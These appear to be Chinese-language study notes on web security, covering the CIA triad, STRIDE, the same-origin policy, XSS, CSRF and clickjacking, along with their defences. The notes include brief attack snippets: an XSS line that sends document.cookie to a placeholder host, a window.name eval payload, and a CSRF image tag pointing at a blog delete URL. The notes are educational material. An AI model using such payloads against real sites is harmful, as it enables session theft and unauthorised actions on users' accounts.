

// 有很多问题，不放到一个海量用户的环境下，是难以暴露出来的。
// 量变引起质变，管理1一台服务器和管理1万台服务器肯定会有区别


// 安全工程师的核心竞争力不在于他能拥有多少个 O day，掌握多少种技术
// 而在于他对安全理解的深度，以及看待安全问题的角度和高度。

// 最可贵的不是那些一个个工业化的方案，而是在解决这些问题时，背后的思考过程。



// 现实世界
No Patch For Stupid   // 人才是最大的漏洞


// 安全的本质
安全问题的本质是信任问题。一旦信任基础不存在，安全将荡然无存


// 安全是一个过程
安全是一件麻烦的事情。任何人想要一劳永逸，都属于一厢情愿，自己骗自己


// 安全三要素   CIA
机密性 // confidentiality  数据内容不能泄露，加密是实现机密性的常见手段
完整性 // integrity  保护数据内容是完整的，不被篡改的。 数字签名  单向散列函数
可用性 // availability   要求保护资源可以随时获取  Dos拒绝服务攻击，把车位都挺满


// 互联网安全的核心
是数据安全的问题



// STRIDE 模型  最早由微软提出
Spoofing				// 伪装	        认证问题
Tampering				// 篡改			完整性
Repudiation 			// 抵赖			认证问题   不可抵赖性
InformationDisclosure	// 信息泄露		机密性
Denial Of Service		// 拒绝服务		可用性
Elevation Of Privilege	// 未经授权获得许可		授权


// secure by default 
黑白名单原则。如果更多的使用白名单，系统会变得更安全
最小权限原则。// 在linux中，一种良好的习惯是使用普通账户登录，执行需要root权限的操作时，通过sudo完成
纵深防御原则额	// 从不同层面，不同的角度，做一套有立体层次感的安全方案。木桶理论，安全方案最怕短板
数据与代码分离原则	
不可预测性原则	// 比如ID没有规律，使用变化的TOKEN。使攻击者无法预知


// 富文本编辑器
XSS检测。使用XSS Filter 对用户输入的HTML进行HTML Parse，再针对标签进行匹配。
这个规则就是一个黑白名单。如果使用黑名单，可以禁用script，iframe等标签。
但未来新的标签可能不在黑名单里面
XSS 真正产生危害的场景是在用户的浏览器上，或者说服务端输出的HTML页面，被注入了恶意代码


// exploit
黑客使用的漏洞

// 脚本小子  script kids
只对攻击有兴趣，对计算机原理和编程技术了解粗浅。 真正造成破坏的，往往是这些脚本小子


// 黑帽子
只要找到系统的一个弱点
利用各种漏洞的组合来达到目的


// 白帽子
必须找到系统所有的弱点
克服某种攻击方法，而非抵御单次的攻击


// 攻击对象
网络，操作系统	// 防火墙，ACL技术的出现，很难再获取root权限
软件	// 比如，利用浏览器漏洞，执行shellcode，下载一个木马在用户机执行。还有Office等软件。
web     // web技术的成熟，使web成为互联网最大的入口

// web
web1	// 人们更关注服务端动态脚本的安全，比如将一个可执行脚本，俗称webshell 上传到服务器，从而获得权限
web2	// 攻击思路从服务端转向了客户端，转向了浏览器和用户


// PHP
PHP至今只能靠较好的代码规范来保证没有漏洞，而无法从语言本身杜绝此类问题



// 浏览器的安全措施
同源策略
沙盒
恶意网站拦截   // 钓鱼网站  挂马网站
EV SSL证书



// 同源策略 Same Origin Policy 	同域名，同端口，同协议
是一种约定，它是浏览器最核心，也是最基本的安全功能。DOM,COOKIE,浏览器插件都受到同源策略影响
限制了不同源的document或脚本，对当前document读取或设置某些属性。不同源的对象无法相互干扰


// html标签跨域  
带有src属性的标签可以跨域加载资源，而不受同源策略影响。其实质是浏览器发起了一个GET请求。
不同于XMLHttpRequest，通过src属性加载的资源，浏览器限制了JS的权限，使其不能读写返回的内容


// XMLHttpRequest   H5中cors已实现跨域
它可以获取和访问同源对象的内容。但不能跨域访问资源。
CORS的安全基础就是信任 JS无法控制HTTP头。如果信任被打破，则安全方案将不再安全


// 挂马
在网页中插入一段恶意代码，利用浏览器漏洞执行任意代码的攻击方式，被称为 挂马


// 多进程架构
浏览器多进程架构，将浏览器功能分模块分开，各个浏览器实例分开，当一个进程崩溃，也不会影响其他进程
flash,java,pdf等插件与浏览器进程严格分离，因此互不影响


// 沙箱	 sandbox
指资源隔离类模块。让不可信任的代码运行在一定的环境中，限制访问。


// 恶意网站拦截
目前各个浏览器厂家的都是基于黑名单的


// EV SSL证书	extended validation SSL Certificate
如果浏览器支持EV,会在地址栏中特别标注




// XSS Cross Site Script 
跨站脚本攻击，指通过 HTML注入 篡改网页，插入恶意脚本。用户浏览网页时，控制住用户。
在一开始，这种攻击是跨域的。发展到今天，是否跨域已经不重要了



// 反射型 XSS  	Non-persistent XSS
将用户输入的数据 反射 给浏览器。需要把恶意链接发给用户，用户点击，才能成功。


// 存储型 XSS   Persistent XSS
黑客写下包含JS代码的文章，文章发表后，所有访问该文章的用户，都会遭到攻击。
用户访问正常的URL，就会遭到攻击


// DOM Based XSS
通过修改DOM节点形成XSS

// XSS Payload
用以完成各种具体功能的XSS恶意脚本



// XSS  cookie劫持
加载JS脚本 - 插入img元素 - src=www.xxx.com?log?encodeURI(document.cookie)


// HttpOnly
禁止JS访问和读取cookie，防止cookie劫持


// XSS构造GET和POST请求
// http://blog.sohu.com/manage/entry.do?m=delete&id=154682
插入一个form表单，自动提交


// NAT 网络地址转换  Network Address Translation



// XSS攻击平台  这些平台主要是为了演示XSS的危害，以及方便渗透测试用的。
Attack API 
BeEF
XSS-Proxy



// XSS WORM
用户之间发生交互行为的页面，如果存在存储型XSS，则比较容易发起 WORM 攻击
如果一个页面只能有用户个人查看，即时存在XSS，也不能被用于XSS WORM 传播


// location.hash 绕过长度限制
location.hash 不会在HTTP包中被发送，所以web日志并不会记录下hash里的内容，很好的隐藏了黑客的意图
location.hash 本身没有长度限制，但浏览器的地址栏有长度的限制，不过这个长度足够也很长的XSS Payload


// base标签 定义相对路径
base标签可以出现在页面的任何地方，并作用于位于该标签之后的所有标签


// window.name
window.name 没有特殊字符的限制。window对象 是浏览器的窗体，而不是document对象，因此很多时候
window对象不受同源策略的限制。可以用来实现跨域，跨页面传递数据。
window.name = "alert(document.cookie)";
eval(name);



// XSS 的防御
HttpOnly
输入检查	// 在客户端和服务端实现相同的输入检查。客户端JS检查，可以阻挡大部分误操作，节约服务器资源
XSS Filter	// 可能不够智能，把《仙剑》 过滤成 仙剑。 改变了用户原本的意思
输出检查	// 除富文本外，在变量输出到HTML时，可以使用编码或转义的方式来防御XSS攻击


XSS的本质是一种 HTML注入。用户的数据被当做HTML代码的一部分来执行

// 富文本的过滤 htmlparser
事件应该被严格禁止。富文本的展示里不应该包含事件。一些危险标签iframe，script，base，form也要禁止
标签的选择上应该使用白名单，比如，只允许，a，img，div



// CSRF Cross Site Request Forgery	跨站请求伪造
攻击者首先在自己的域构造一个页面：http：//www.a.com/csrf.html
其内容为：<img src="http://blog.sohu.com/manage/entry.do?m=delete&id=153485" >
攻击者诱使 博主 反问该页面。用户看到一张无法显示的图片，回头再看博客，文章已经被删除。


// session cookie 又称 临时cookie
浏览器关闭，session cookie 失效


// third-party cookie 本地cookie
是服务器指定了expire时间。到期才会失效


// GET & POST 
对于很多网站来说，并没有对一些重要操作严格区分GET和POST。攻击者可以使用GET请求来提交表单。
比如PHP，如果使用$_REQUEST，而非$_POST获取变量，则会存在这个问题。

// 构造表单，用JS自动提交
如果服务端做了严格区分，攻击者可以利用表单提交。甚至将页面隐藏在一个不可见的iframe中



// CSRF 的防御
验证码被认为是对抗CSRF攻击最简洁有效的防御方法

CSRF攻击，往往是用户在不知情的情况下构造了网络请求。而验证码，则强制用户与应用交互，才能完成请求。
但是出于用户体验考虑，不可能给所有操作都加上验证码。

因此验证码只能作为防御CSRF的一种手段，而不能作为主要解决方案。


// Referer Check
Referer Check在网上最常见的应用是 防止图片盗链。同理，可以检测请求是否来自合法的源。
Referer Check的缺陷在于，服务器并非任何时候都能取到 Referer。
比如从HTTPS向HTTP跳转，出于安全考虑，浏览器也不会发送Referer。


// CSRF的本质
CSRF为什么可以成功，其本质原因是重要操作的所有参数都是可以被猜到的

// token    不可预测性原则
新增一个随机 token，在实际应用时，token可以放在用户的session中，或者浏览器的cookie中。
服务器验证session中的token和用户发送的token是否一致，如果一致，则认为是合法请求。

token如果保存在cookie中，则会带来一个新的问题。如果用户打开几个相同的页面，
当某个页面的token消耗以后，其他页面的表单内保存的还是被消耗掉的TOKEN





// 点击劫持 ClickJacking   它利用的就是与用户产生交互的页面
攻击者使用一个透明的，不可见的iframe，覆盖在网页上，然后诱使用户在该网页上操作，
用户将在不知情的情况下点击透明的iframe页面。

点击劫持没有用户交互的顾虑，它利用的就是与用户产生交互的页面


// 拖拽劫持 Drag&Drop   不受同源策略限制
浏览器中的拖拽对象可以是一个链接，一段文字，也可以从一个窗口拖到另一个窗口，
因此拖拽是不受同源策略限制的。


// 触屏劫持 TapJacking


// 点击劫持 的 防御

// frame busting
通常写一段JS代码，禁止iframe嵌套。这种方法叫做frame busting。

// example
if(top.location != location){
	top.location = self.location;
}


frame busting 是JS写的，控制能力不强，可以有许多方法绕过。



// iframe 的 sandbox
iframe一直被人们所诟病。挂马,XSS,ClickJacking都有它不光彩的身影。
H5中专门为iframe定义了一个新属性，叫sandbox。使用sandbox后，iframe加载的内容被视为一个独立的源。
其中的脚本将被禁止执行，表单禁止提交，插件禁止加载。


// noreferer
a标签和area标签在定义了noreferer以后，将不再发送referer


// canvas 破解验证码。
canvas 允许JS在页面中直接操作图片对象，甚至直接操作像素。


// local storage 	也受到同源策略影响，每个域所拥有的信息只会保存在自己的域下。
类似非关系型数据库，由key-value 组成。